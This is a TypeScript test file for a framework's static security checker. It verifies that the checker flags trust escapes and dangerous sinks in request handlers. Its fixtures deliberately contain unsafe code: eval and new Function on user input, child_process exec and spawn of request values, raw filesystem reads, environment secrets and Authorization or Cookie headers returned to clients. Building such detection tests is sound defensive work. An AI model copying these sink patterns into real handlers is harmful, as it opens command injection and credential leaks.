import * as nodeFs from 'node:fs';
import * as nodeFsPromises from 'node:fs/promises';
import { builtinModules as nodeBuiltinModules } from 'node:module';

import { ts } from 'ts-morph';
import { describe, expect, it } from 'vitest';

import {
  collectStaticBuildTrustFactsFromProject,
  collectTrustEscapesFromProject,
  collectUnregisteredSinksFromProject,
} from '@kovojs/drizzle/internal/static';
import type { TrustEscapeSourceFileInput } from '@kovojs/drizzle/internal/static';

function trustEscapesFor(source: string, fileName = 'app.tsx') {
  return collectTrustEscapesFromProject({ files: [{ fileName, source }] });
}

function trustEscapesForFiles(files: readonly TrustEscapeSourceFileInput[]) {
  return collectTrustEscapesFromProject({ files });
}

function sinksFor(source: string, fileName = 'app.tsx') {
  return collectUnregisteredSinksFromProject({ files: [{ fileName, source }] });
}

function sinksForFiles(files: readonly TrustEscapeSourceFileInput[]) {
  return collectUnregisteredSinksFromProject({ files });
}

describe('@kovojs/drizzle trust-escape collector (KV426, audit-only)', () => {
  it('emits a trustedHtml escape with no justification when none is provided', () => {
    const escapes = trustEscapesFor(`
      import { trustedHtml } from '@kovojs/browser';
      export function Promo(html: string) {
        return trustedHtml(html);
      }
    `);

    expect(escapes).toEqual([
      expect.objectContaining({
        kind: 'trustedHtml',
        safePath: 'trustedHtml',
        site: 'app.tsx:4',
        source: 'html',
      }),
    ]);
    expect(escapes[0]?.justification).toBeUndefined();
  });

  it('keeps legacy bare trustedHtml visible without accepting local shadows', () => {
    const escapes = trustEscapesFor('export const body = trustedHtml(cms.promo);');

    expect(escapes).toEqual([
      expect.objectContaining({
        kind: 'trustedHtml',
        safePath: 'trustedHtml',
        site: 'app.tsx:1',
        source: 'cms.promo',
      }),
    ]);
  });

  it('captures a justification from an options object, trailing string, or leading comment', () => {
    const escapes = trustEscapesFor(`
      import { trustedHtml, trustedUrl } from '@kovojs/browser';
      const a = trustedHtml(body, { justification: 'cms sanitizer owns rich text' });
      const b = trustedUrl(href, 'reviewed deep link');
      // justification: legacy embed
      const c = trustedHtml(embed);
    `);

    const byKindSource = Object.fromEntries(
      escapes.map((escape) => [`${escape.kind}:${escape.source}`, escape.justification]),
    );
    expect(byKindSource['trustedHtml:body']).toBe('cms sanitizer owns rich text');
    expect(byKindSource['trustedUrl:href']).toBe('reviewed deep link');
    expect(byKindSource['trustedHtml:embed']).toBe('legacy embed');
  });

  it('emits a trustedSql escape', () => {
    const escapes = trustEscapesFor(`
      import { trustedSql, sql } from '@kovojs/drizzle';
      export const clause = trustedSql(sql.raw('where archived = false'), { justification: 'static report clause' });
    `);
    expect(escapes).toEqual([
      expect.objectContaining({ kind: 'trustedSql', justification: 'static report clause' }),
    ]);
  });

  it('resolves trust escape callees through aliases, namespaces, local aliases, and barrels', () => {
    const escapes = trustEscapesForFiles([
      {
        fileName: 'browser-barrel.ts',
        source: "export { trustedHtml as barrelHtml } from '@kovojs/browser';",
      },
      {
        fileName: 'app.tsx',
        source: `
          import { trustedHtml as th, trustedUrl } from '@kovojs/browser';
          import * as browser from '@kovojs/browser';
          import { trustedSql } from '@kovojs/drizzle';
          import * as server from '@kovojs/server';
          import { barrelHtml } from './browser-barrel';
          const localUrl = trustedUrl;
          const localHtml = (value: string) => value;

          th(aliasHtml);
          browser.trustedHtml(namespaceHtml);
          localUrl(aliasUrl);
          trustedSql(rawSql);
          server.endpoint('/raw', { reason: 'raw transport' });
          server.webhook('unsigned', { verify: 'none', verifyJustification: 'fixture' });
          barrelHtml(barrel);
          localHtml(shadowed);
        `,
      },
    ]);

    expect(escapes.map((escape) => `${escape.kind}:${escape.source}`).sort()).toEqual([
      'rawEndpoint:/raw',
      'trustedHtml:aliasHtml',
      'trustedHtml:barrel',
      'trustedHtml:namespaceHtml',
      'trustedSql:rawSql',
      'trustedUrl:aliasUrl',
      'webhookVerifyNone:unsigned',
    ]);
  });

  it('resolves literal element access through export-star barrels without trusting computed keys', () => {
    const escapes = trustEscapesForFiles([
      {
        fileName: 'browser-root.ts',
        source: "export { trustedHtml, trustedUrl } from '@kovojs/browser';",
      },
      {
        fileName: 'browser-barrel.ts',
        source: "export * from './browser-root';",
      },
      {
        fileName: 'app.tsx',
        source: `
          import * as browser from './browser-barrel';
          const htmlKey = 'trustedHtml';

          browser['trustedHtml'](starHtml);
          browser['trustedUrl'](starHref);
          browser[htmlKey](opaqueHtml);
        `,
      },
    ]);

    expect(escapes.map((escape) => `${escape.kind}:${escape.source}`).sort()).toEqual([
      'trustedHtml:starHtml',
      'trustedUrl:starHref',
    ]);
  });

  it('shares exact barrel trust identity with request analysis without opening hidden callees', () => {
    const barrelFiles = [
      {
        fileName: 'browser-root.ts',
        source: "export { trustedHtml, trustedUrl } from '@kovojs/browser';",
      },
      {
        fileName: 'browser-barrel.ts',
        source: "export * from './browser-root.js';",
      },
    ] as const;
    const exact = sinksForFiles([
      ...barrelFiles,
      {
        fileName: 'app.ts',
        source: `
          import { query } from '@kovojs/server';
          import { trustedHtml, trustedUrl } from './browser-barrel.js';
          export const promo = query({ load(input) {
            return { body: trustedHtml(input.body), href: trustedUrl(input.href) };
          } });
        `,
      },
    ]);
    expect(exact).toEqual([]);

    for (const hiddenBody of [
      `const trust = { html: trustedHtml }; return trust.html(input.body);`,
      `const key = 'trustedHtml'; return browser[key](input.body);`,
      `return [trustedHtml][0](input.body);`,
    ]) {
      const hidden = sinksForFiles([
        ...barrelFiles,
        {
          fileName: 'app.ts',
          source: `
            import { query } from '@kovojs/server';
            import { trustedHtml } from './browser-barrel.js';
            import * as browser from './browser-barrel.js';
            export const promo = query({ load(input) { ${hiddenBody} } });
          `,
        },
      ]);
      expect(hidden, hiddenBody).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            sink: expect.stringMatching(/^request-handler\.opaque-/u),
          }),
        ]),
      );
    }
  });

  it('does not collect local shadows as framework trust escapes', () => {
    const escapes = trustEscapesFor(`
      function trustedHtml(value: string) { return value; }
      const endpoint = (path: string) => path;
      const webhook = (name: string) => name;
      trustedHtml(html);
      endpoint('/fake');
      webhook('fake', { verify: 'none' });
    `);

    expect(escapes).toEqual([]);
  });

  it('emits a rawEndpoint escape per endpoint() declaration', () => {
    const escapes = trustEscapesFor(`
      import { endpoint } from '@kovojs/server';
      export const health = endpoint('/healthz', {
        method: 'GET',
        reason: 'read-only health probe',
        handler: () => new Response('ok'),
      });
    `);
    expect(escapes).toEqual([
      expect.objectContaining({
        kind: 'rawEndpoint',
        safePath: 'endpoint(...)',
        source: '/healthz',
        justification: 'read-only health probe',
      }),
    ]);
  });

  it('emits a webhookVerifyNone escape only for verify:none webhooks', () => {
    const escapes = trustEscapesFor(`
      import { webhook, s } from '@kovojs/server';
      export const paid = webhook('order-paid', {
        path: '/webhooks/order-paid',
        verify: 'none',
        verifyJustification: 'internal test fixture',
        input: s.object({ orderId: s.string() }),
        handler: (input, ctx) => ({ changes: [] }),
      });
      export const signed = webhook('order-signed', {
        path: '/webhooks/order-signed',
        verify: hmacSignature(secret),
        input: s.object({ orderId: s.string() }),
        handler: (input, ctx) => ({ changes: [] }),
      });
    `);
    expect(escapes).toEqual([
      expect.objectContaining({
        kind: 'webhookVerifyNone',
        safePath: 'webhook({verify:none})',
        source: 'order-paid',
        justification: 'internal test fixture',
      }),
    ]);
  });

  it('emits a verify:none webhook escape with no justification when missing', () => {
    const escapes = trustEscapesFor(`
      import { webhook, s } from '@kovojs/server';
      export const paid = webhook('order-paid', {
        path: '/webhooks/order-paid',
        verify: 'none',
        input: s.object({ orderId: s.string() }),
        handler: (input, ctx) => ({ changes: [] }),
      });
    `);
    expect(escapes).toHaveLength(1);
    expect(escapes[0]?.kind).toBe('webhookVerifyNone');
    expect(escapes[0]?.justification).toBeUndefined();
  });
});

// @kovo-security-classifier-corpus kv424-request-process
describe('@kovojs/drizzle dangerous-sink collector (KV424, conservative)', () => {
  it('flags an innerHTML write inside a JSX event handler', () => {
    const facts = sinksFor(`
      export function Widget(userInput: string) {
        return <button onClick={() => { el.innerHTML = userInput; }}>go</button>;
      }
    `);
    expect(facts).toEqual([
      expect.objectContaining({ sink: 'innerHTML', safePath: 'trustedHtml', source: 'userInput' }),
    ]);
  });

  it('flags eval, document.write, setTimeout-string and new Function in handlers', () => {
    const facts = sinksFor(`
      export function Widget(code: string, markup: string) {
        return (
          <button
            onClick={() => {
              eval(code);
              document.write(markup);
              setTimeout("doThing()", 100);
              const f = new Function("return 1");
            }}
          >
            go
          </button>
        );
      }
    `);
    const sinks = facts.map((fact) => fact.sink).sort();
    expect(sinks).toEqual(['Function', 'document.write', 'eval', 'setTimeout']);
  });

  it('does NOT flag local Function or document shadows as global sinks', () => {
    const facts = sinksFor(`
      export function Widget(markup: string) {
        return (
          <button
            onClick={() => {
              const document = { write(_value: string) {} };
              const Function = class {};
              document.write(markup);
              new Function();
            }}
          >
            go
          </button>
        );
      }
    `);
    expect(facts).toEqual([]);
  });

  it('does NOT flag dangerous sinks outside handler bodies (conservative)', () => {
    const facts = sinksFor(`
      export function buildHtml(markup: string) {
        const el = document.createElement('div');
        el.innerHTML = markup;
        return el;
      }
    `);
    expect(facts).toEqual([]);
  });

  it('does NOT flag setTimeout with a function callback', () => {
    const facts = sinksFor(`
      export function Widget() {
        return <button onClick={() => { setTimeout(() => doThing(), 100); }}>go</button>;
      }
    `);
    expect(facts).toEqual([]);
  });

  it('flags child_process exports across every request-handler surface and static import shape', () => {
    const facts = sinksFor(
      `
      import childProcess, {
        exec as runShell,
        execFileSync as runFile,
      } from 'node:child_process';
      import * as processApi from 'child_process';
      import { endpoint, mutation, query, task, webhook } from '@kovojs/server';

      const { spawnSync: runSpawn } = processApi;
      const required = require('node:child_process');

      export const mutate = mutation({ handler(input) { runFile(input.program); } });
      export const load = query({ load(input) { runShell(input.command); } });
      export const raw = endpoint('/raw', { handler(request) { childProcess.spawn(request.url); } });
      export const job = task({ run(input) { runSpawn(input.program); } });
      export const hook = webhook('/hook', { handler(input) { required.fork(input.module); } });
    `,
      'app.mjs',
    );

    expect(facts.map((fact) => fact.sink).sort()).toEqual([
      'child_process.exec',
      'child_process.execFileSync',
      'child_process.fork',
      'child_process.spawn',
      'child_process.spawnSync',
      'request-handler.opaque-protocol',
    ]);
  });

  it('follows local and relative helper aliases to raw process sinks', () => {
    const facts = sinksForFiles([
      {
        fileName: 'app.ts',
        source: `
          import { mutation } from '@kovojs/server';
          import { invoke } from './worker.js';
          const alias = invoke;
          export const run = mutation({ handler(input) { return alias(input.program); } });
        `,
      },
      {
        fileName: 'worker.ts',
        source: `
          import * as child from 'node:child_process';
          export function invoke(program: string) { return child.execFileSync(program); }
        `,
      },
    ]);

    expect(facts).toEqual([
      expect.objectContaining({
        sink: 'child_process.execFileSync',
        source: 'program',
      }),
    ]);
  });

  it('fails closed for bare-package handlers and request-reachable helper calls outside the snapshot', () => {
    const facts = sinksFor(`
      import { hiddenHandler, helper as packageHelper } from 'external-actions';
      import * as external from 'external-namespace';
      import { mutation, query } from '@kovojs/server';

      export const direct = mutation({ handler: hiddenHandler });
      export const wrapped = mutation({ handler(input) { return packageHelper(input.value); } });
      export const namespaced = query({ load(input) { return external.load(input.value); } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: 'external-actions',
        }),
        expect.objectContaining({
          sink: 'request-handler.opaque-package-call',
          source: 'external-actions',
        }),
        expect.objectContaining({
          sink: 'request-handler.opaque-package-call',
          source: 'external-namespace',
        }),
      ]),
    );
  });

  it('keeps the canonical runCommand surface open but rejects raw literal process calls and local lookalikes', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { commandAllowlist, cmd, mutation, runCommand } from '@kovojs/server';

      const allow = commandAllowlist(['/usr/bin/true'], { justification: 'fixture' });
      const command = cmd('/usr/bin/true', [], { allow });
      function localRunCommand() { return execFileSync('/usr/bin/true'); }

      export const safe = mutation({ async handler() {
        await runCommand(command);
        return { ok: true };
      } });
      export const unsafe = mutation({ handler() { return localRunCommand(); } });
    `);

    expect(facts).toEqual([
      expect.objectContaining({
        sink: 'child_process.execFileSync',
        source: "'/usr/bin/true'",
      }),
    ]);
  });

  it('does not grant framework trust through reflective or constructor adapters', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { cmd, commandAllowlist, query, runCommand } from '@kovojs/server';
      const allow = commandAllowlist(['/usr/bin/true'], { justification: 'fixture' });
      const command = cmd('/usr/bin/true', [], { allow });
      Object.defineProperty(query, 'pwn', {
        value: () => execFileSync('mutated-framework-member'),
      });
      export const reflected = query({ load() {
        Reflect.apply(runCommand, null, [command]);
        return Reflect.apply(query.pwn, null, []);
      } });
      export const constructed = query({ load() {
        return new query({ load() { return { ok: true }; } });
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'Reflect.apply' }),
        expect.objectContaining({
          sink: 'request-handler.opaque-constructor',
          source: 'query',
        }),
      ]),
    );
  });

  it('resolves local static configs and fails closed for opaque factory configs', () => {
    const facts = sinksFor(`
      import { execSync } from 'node:child_process';
      import { mutation } from '@kovojs/server';
      import { externalConfig } from 'external-actions';

      const localConfig = { handler(input) { return execSync(input.command); } };
      export const local = mutation(localConfig);
      export const external = mutation(externalConfig);
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.execSync', source: 'input.command' }),
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: 'external-actions',
        }),
      ]),
    );
  });

  it('closes dynamic import, eval, Function, string timers, and node:vm at server-handler roots', () => {
    const facts = sinksFor(`
      import * as vm from 'node:vm';
      import { mutation } from '@kovojs/server';
      const { runInNewContext: execute } = vm;

      export const unsafe = mutation({
        async handler(input) {
          eval(input.code);
          Function(input.code);
          new Function(input.code);
          setTimeout('globalThis.compromised = true', 1);
          await import(input.module);
          execute(input.code);
          return new vm.Script(input.code).runInThisContext();
        },
      });
    `);

    expect(facts.map((fact) => fact.sink).sort()).toEqual([
      'Function',
      'Function',
      'eval',
      'import()',
      'node:vm.Script',
      'node:vm.runInNewContext',
      'request-handler.opaque-protocol',
      'setTimeout',
    ]);
  });

  it('closes aliased eval, Function, timers, and function-constructor indirection', () => {
    const facts = sinksFor(`
      import { mutation } from '@kovojs/server';
      const moduleEval = eval;
      const ModuleFunction = Function;
      const later = setTimeout;

      export const unsafe = mutation({
        handler(input) {
          const localEval = eval;
          localEval(input.code);
          (0, eval)(input.code);
          Reflect.apply(moduleEval, null, [input.code]);
          new ModuleFunction(input.code);
          later(input.code, 1);
          [input.code].map(setInterval);
          return (() => {}).constructor(input.code)();
        },
      });
    `);

    expect(facts.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining([
        'Function',
        'Function.constructor',
        'eval',
        'setInterval',
        'setTimeout',
      ]),
    );
  });

  it('keeps direct and aliased timers open for statically resolved function callbacks', () => {
    const facts = sinksFor(`
      import { mutation } from '@kovojs/server';
      const later = setTimeout;
      function callback() {}
      export const safe = mutation({ handler() {
        setTimeout(() => {}, 1);
        later(callback, 1);
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('accepts only direct native Promise settlement callbacks as timer functions', () => {
    expect(
      sinksFor(`
        import { route } from '@kovojs/server';
        export const safe = route('/', { async page() {
          await new Promise((resolve) => setTimeout(resolve, 1));
          return 'done';
        } });
      `),
    ).toEqual([]);

    for (const body of [
      'const alias = resolve; setTimeout(alias, 1);',
      'globalThis.Promise = class {}; setTimeout(resolve, 1);',
    ]) {
      const facts = sinksFor(`
        import { route } from '@kovojs/server';
        export const unsafe = route('/', { async page() {
          await new Promise((resolve) => { ${body} });
          return 'done';
        } });
      `);
      expect(
        facts.map((fact) => fact.sink),
        body,
      ).toContain('setTimeout');
    }

    for (const setup of [
      `function executor(resolve) { setTimeout(resolve, 1); }
       export const unsafe = mutation({ handler(input) {
         new Promise(executor);
         executor(input.code);
       } });`,
      `const executor = (resolve) => setTimeout(resolve, 1);
       const executorAlias = executor;
       export const unsafe = mutation({ handler() {
         return new Promise(executorAlias);
       } });`,
    ]) {
      const facts = sinksFor(`
        import { mutation } from '@kovojs/server';
        ${setup}
      `);
      expect(
        facts.map((fact) => fact.sink),
        setup,
      ).toContain('setTimeout');
    }
  });

  it('closes process.getBuiltinModule, createRequire, and dynamic require resolution', () => {
    const facts = sinksFor(`
      import { createRequire } from 'node:module';
      import { mutation } from '@kovojs/server';
      const localRequire = createRequire(import.meta.url);

      export const unsafe = mutation({ handler(input) {
        process.getBuiltinModule('node:child_process').execFileSync(input.program);
        localRequire('node:fs').readFileSync(input.path);
        return require(input.module);
      } });
    `);

    expect(facts.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining([
        'child_process.execFileSync',
        'node:fs.readFileSync',
        'node:module.dynamic-resolution',
      ]),
    );
  });

  it('closes raw filesystem and path authority across aliases, namespaces, require, and computed access', () => {
    const facts = sinksFor(
      `
      import { readFileSync as read } from 'node:fs';
      import * as fsApi from 'fs';
      import pathApi, { posix as posixPath, resolve as resolvePath } from 'node:path';
      import { endpoint } from '@kovojs/server';

      const { promises: fsPromises } = require('node:fs');
      const requiredFs = require('fs');
      const requiredPath = require('path');

      export const raw = endpoint('/raw', {
        async handler(request) {
          read(resolvePath(request.url));
          fsApi['writeFileSync'](request.url, 'unsafe');
          await fsPromises.readFile(request.url);
          requiredFs.createReadStream(pathApi.posix.join('/tmp', request.url));
          posixPath.resolve(request.url);
          requiredPath[request.method](request.url);
          return fsApi[request.method](request.url);
        },
      });
    `,
      'app.mjs',
    );

    expect(facts.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining([
        'node:fs.[computed]',
        'node:fs.createReadStream',
        'node:fs.readFile',
        'node:fs.readFileSync',
        'node:fs.writeFileSync',
        'node:path.[computed]',
        'node:path.join',
        'node:path.resolve',
      ]),
    );
  });

  it('fails closed over the current node:fs and node:fs/promises export census', () => {
    const inert = new Set([
      'Dir',
      'Dirent',
      'Stats',
      'Utf8Stream',
      '_toUnixTimestamp',
      'constants',
    ]);
    const filesystemExports = Object.keys(nodeFs).sort();
    const promiseExports = Object.keys(nodeFsPromises).sort();
    expect(filesystemExports).toEqual(
      expect.arrayContaining(['mkdtempDisposableSync', 'openAsBlob', 'readFileSync']),
    );
    expect(promiseExports).toEqual(expect.arrayContaining(['mkdtempDisposable', 'readFile']));
    const collectModule = (module: string, exports: readonly string[]) => {
      const bindings = exports.map((name, index) => `${name} as authority_${index}`);
      const references = exports.map((_name, index) => `authority_${index}`);
      return sinksFor(
        `
          import { ${bindings.join(', ')} } from '${module}';
          import { mutation } from '@kovojs/server';
          export const census = mutation({ handler() { return [
            ${references.join(',\n')}
          ]; } });
        `,
        'app.mjs',
      );
    };

    for (const [module, exports] of [
      ['node:fs', filesystemExports],
      ['node:fs/promises', promiseExports],
    ] as const) {
      const expected = new Set(exports.filter((name) => !inert.has(name)));
      const actual = new Set(
        collectModule(module, exports).map((fact) => fact.sink.replace('node:fs.', '')),
      );
      expect(actual, module).toEqual(expected);
    }
  });

  it('fails closed over every unreviewed Node builtin namespace', () => {
    const safeBuiltins = new Set<string>();
    const modules = [
      ...new Set(nodeBuiltinModules.map((module) => module.replace(/^node:/u, ''))),
    ].sort();
    expect(modules).toEqual(expect.arrayContaining(['inspector', 'process', 'sqlite']));
    const imports = modules.map(
      (module, index) => `import * as builtin_${index} from 'node:${module}';`,
    );
    const references = modules.map((_module, index) => `builtin_${index}`);
    const facts = sinksFor(
      `
        ${imports.join('\n')}
        import { mutation } from '@kovojs/server';
        export const census = mutation({ handler() { return [
          ${references.join(',\n')}
        ]; } });
      `,
      'app.mjs',
    );

    expect(facts).toHaveLength(modules.filter((module) => !safeBuiltins.has(module)).length);
  });

  it('fails closed for the unpinnable structuredClone global', () => {
    const facts = sinksFor(`
      import { mutation } from '@kovojs/server';
      mutation({ handler(input) { return structuredClone(input); } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'structuredClone',
        }),
      ]),
    );
  });

  it('closes callback, Reflect.apply, bind, and computed-namespace authority escapes', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import * as child from 'child_process';
      import * as fs from 'node:fs';
      import { mutation } from '@kovojs/server';

      const moduleBound = execFileSync.bind(null);

      export const unsafe = mutation({
        async handler(input) {
          [input.value].map(execFileSync);
          [input.value].map(moduleBound);
          await Promise.resolve(input.value).then(fs.readFileSync);
          Reflect.apply(execFileSync, null, [input.value]);
          const bound = execFileSync.bind(null);
          bound(input.value);
          return child[input.method];
        },
      });
    `);

    expect(facts.filter((fact) => fact.sink === 'child_process.execFileSync')).toHaveLength(5);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.[computed]' }),
        expect.objectContaining({ sink: 'node:fs.readFileSync' }),
      ]),
    );
  });

  it('closes worker, cluster, Bun, and Deno process authority at request roots', () => {
    const facts = sinksFor(`
      import { Worker as Thread } from 'node:worker_threads';
      import cluster from 'node:cluster';
      import { mutation } from '@kovojs/server';

      export const unsafe = mutation({
        handler(input) {
          new Thread(input.code, { eval: true });
          cluster.fork();
          Bun.spawn([input.code]);
          Bun.$\`\${input.code}\`;
          Bun.file(input.path);
          Deno.run({ cmd: [input.code] });
          await Deno.readTextFile(input.path);
          await Deno.writeFile(input.path, input.bytes);
          Bun[input.method];
          Deno[input.method];
          globalThis['process'][input.method];
          return new Deno.Command(input.code);
        },
      });
    `);

    expect(facts.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining([
        'Bun.spawn',
        'Bun.$',
        'Bun.[computed]',
        'Bun.file',
        'Deno.Command',
        'Deno.[computed]',
        'Deno.readTextFile',
        'Deno.run',
        'Deno.writeFile',
        'node:cluster.fork',
        'node:process.[computed]',
        'node:worker_threads.Worker',
      ]),
    );
  });

  it('closes raw server environment namespaces and aliases at request roots', () => {
    const facts = sinksFor(
      `
      import nodeProcess from 'node:process';
      import { query, route } from '@kovojs/server';

      const viteEnvironment = import.meta.env;
      const processEnvironment = nodeProcess.env;
      export const unsafe = query({ load() {
        return {
          bun: Bun.env.SECRET,
          deno: Deno.env.get('SECRET'),
          globalProcess: process.env.SECRET,
          importedProcess: processEnvironment.SECRET,
          vite: viteEnvironment.SECRET,
        };
      } });
    `,
      'app.mjs',
    );

    expect(facts.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining(['Bun.env', 'Deno.env', 'import.meta.env', 'node:process.env']),
    );
  });

  it('follows raw environment values through relative modules', () => {
    const facts = sinksForFiles([
      {
        fileName: 'config.ts',
        source: `
          export const serverSecret = import.meta.env.APP_SECRET;
          export default { publicValue: 'safe', secret: import.meta.env.OTHER_SECRET };
        `,
      },
      {
        fileName: 'app.ts',
        source: `
          import { query } from '@kovojs/server';
          import config from './config.js';
          import * as configNamespace from './config.js';
          import { serverSecret } from './config.js';
          export const named = query({ load() { return { serverSecret }; } });
          export const namespace = query({ load() { return configNamespace.serverSecret; } });
          export const defaultSecret = query({ load() { return config.secret; } });
          export const safe = query({ load() { return config.publicValue; } });
        `,
      },
    ]);

    expect(facts.filter((fact) => fact.sink === 'import.meta.env')).toHaveLength(3);
  });

  it('keeps retained-config environment authority out of callback parameter fields', () => {
    const facts = sinksForFiles([
      {
        fileName: 'auth.ts',
        source: `
          export const appCsrf = {
            field: 'csrf',
            secret: process.env.APP_SECRET,
            sessionId(request) { return request.session?.id; },
          };
        `,
      },
      {
        fileName: 'schema.ts',
        source: `
          import { pgTable, text } from 'drizzle-orm/pg-core';
          export const contacts = pgTable('contacts', { email: text('email') });
        `,
      },
      {
        fileName: 'mutations.ts',
        source: `
          import { mutation, publicAccess, s } from '@kovojs/server';
          import { eq } from 'drizzle-orm';
          import { appCsrf } from './auth.js';
          import { contacts } from './schema.js';
          export const addContact = mutation({
            access: publicAccess('fixture'),
            csrf: appCsrf,
            input: s.object({ email: s.string(), name: s.string() }),
            async handler({ email, name }, request) {
              const rows = await request.db.select().from(contacts)
                .where(eq(contacts.email, email)).limit(1);
              return { name, count: rows.length };
            },
          });
        `,
      },
    ]);

    expect(facts.filter((fact) => fact.sink === 'node:process.env')).toEqual([]);
  });

  it('closes raw credential headers and whole request carriers returned across public wires', () => {
    const facts = sinksFor(`
      import { endpoint, mutation, query, webhook } from '@kovojs/server';

      export const mutate = mutation({ handler(_input, request) {
        return { cookie: request.headers.get('COOKIE') };
      } });
      export const load = query({ load(_input, context) {
        return { authorization: context.request.headers.get('authorization') };
      } });
      export const raw = endpoint('/raw', { handler(request) {
        return Response.json({ proxy: request.headers.get('Proxy-Authorization') });
      } });
      export const hook = webhook('/hook', { handler(_input, context) {
        return context.fail('credential-leak', { headers: context.request.headers });
      } });
    `);

    expect(facts.map((fact) => fact.sink)).toEqual(
      expect.arrayContaining([
        'client-wire.request.header.Authorization',
        'client-wire.request.header.Cookie',
        'client-wire.request.header.Proxy-Authorization',
        'client-wire.request.headers',
      ]),
    );
  });

  it('closes destructured, bound, dynamic, enumerated, and container credential escapes', () => {
    const facts = sinksFor(`
      import { mutation, query } from '@kovojs/server';

      export const dynamic = mutation({ handler(input, { headers }) {
        const get = headers.get.bind(headers);
        const result = { safe: true };
        result.token = get(input.headerName);
        return result;
      } });
      export const enumerated = query({ load(_input, { request: { headers } }) {
        return Object.fromEntries(headers);
      } });
    `);

    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.headers.dynamic' }),
        expect.objectContaining({ sink: 'client-wire.request.headers' }),
      ]),
    );
  });

  it('follows local helper returns without rejecting a helper that projects safe request metadata', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      function safeUrl(request) { return request.url; }
      function reveal(request) { return request.headers.get('authorization'); }

      export const load = query({ load(_input, context) {
        return { safe: safeUrl(context.request), token: reveal(context.request) };
      } });
    `);

    expect(facts.filter((fact) => fact.sink === 'client-wire.request.credentials')).toEqual([]);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
  });

  it('follows credential projections through relative helper modules', () => {
    const facts = sinksForFiles([
      {
        fileName: 'helper.ts',
        source: `
          export function reveal(request) { return request.headers.get('authorization'); }
          export function safeUrl(request) { return request.url; }
        `,
      },
      {
        fileName: 'app.ts',
        source: `
          import { query } from '@kovojs/server';
          import { reveal, safeUrl } from './helper.js';
          export const load = query({ load(_input, context) {
            return { safe: safeUrl(context.request), token: reveal(context.request) };
          } });
        `,
      },
    ]);

    expect(
      facts.filter((fact) => fact.sink === 'client-wire.request.header.Authorization'),
    ).toHaveLength(1);
    expect(facts.filter((fact) => fact.sink === 'client-wire.request.credentials')).toEqual([]);
  });

  it('closes transformed, closure-captured, aliased-container, and helper-write credential flows', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      function revealDestructured({ headers }) { return headers.get('authorization'); }
      function fill(result, request) { result.token = request.headers.get('authorization'); }
      function safeProjection({ request }) { return request.url; }

      export const transformed = query({ load(_input, { request }) {
        const token = request.headers.get('authorization');
        return { prefix: token?.slice(0, 4) };
      } });
      export const closure = query({ load(_input, { request }) {
        const reveal = () => request.headers.get('authorization');
        return { token: reveal() };
      } });
      export const aliasedContainer = query({ load(_input, { request }) {
        const result = {};
        const alias = result;
        alias.token = request.headers.get('authorization');
        return result;
      } });
      export const helperWrite = query({ load(_input, { request }) {
        const result = {};
        fill(result, request);
        return result;
      } });
      export const destructuredHelper = query({ load(_input, { request }) {
        return { token: revealDestructured(request) };
      } });
      export const safeHelper = query({ load(_input, { request }) {
        return { url: safeProjection({ request }) };
      } });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'client-wire.request.header.Authorization'),
    ).toHaveLength(5);
    expect(facts.filter((fact) => fact.sink === 'client-wire.request.credentials')).toEqual([]);
  });

  it('closes whole-header callback and iterator copies into returned containers', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      export const callbackCopy = query({ load(_input, { request }) {
        const result = {};
        request.headers.forEach((value, name) => { result[name] = value; });
        return result;
      } });
      export const iteratorCopy = query({ load(_input, { request }) {
        const result = {};
        for (const [name, value] of request.headers.entries()) result[name] = value;
        return result;
      } });
    `);

    expect(
      facts.filter((fact) => fact.sink === 'client-wire.request.headers'),
      JSON.stringify(facts),
    ).toHaveLength(2);
  });

  it('keeps exact server-side credential decisions and non-credential projections open', () => {
    const facts = sinksFor(`
      import { endpoint, mutation, query } from '@kovojs/server';

      export const mutate = mutation({ handler(_input, request) {
        const authorized = request.headers.get('authorization');
        if (!authorized) throw new Error('missing authorization');
        return { ok: true };
      } });
      export const load = query({ load(_input, { request }) {
        return {
          contentType: request.headers.get('content-type'),
          hasAuthorization: request.headers.has('authorization'),
          url: request.url,
        };
      } });
      export const raw = endpoint('/raw', { handler(request) {
        return Response.json({ method: request.method, url: request.url });
      } });
    `);

    expect(facts).toEqual([]);
  });

  it('propagates credential aliases returned by public-wire transforming callbacks', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      export const leak = query({ load(_input, { request }) {
        const auth = request.headers.get('authorization');
        return {
          arrayFrom: Array.from([0], () => auth),
          flatMap: [0].flatMap(() => auth),
          grouped: Object.groupBy([0], () => auth),
          jsonParse: JSON.parse('{}', () => auth),
          jsonStringify: JSON.stringify({}, () => auth),
          map: [0].map(() => auth),
          reduce: [0].reduce(() => auth, ''),
          replace: 'x'.replace('x', () => auth),
          replaceAll: 'x'.replaceAll('x', () => auth),
        };
      } });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.header.Authorization' }),
      ]),
    );
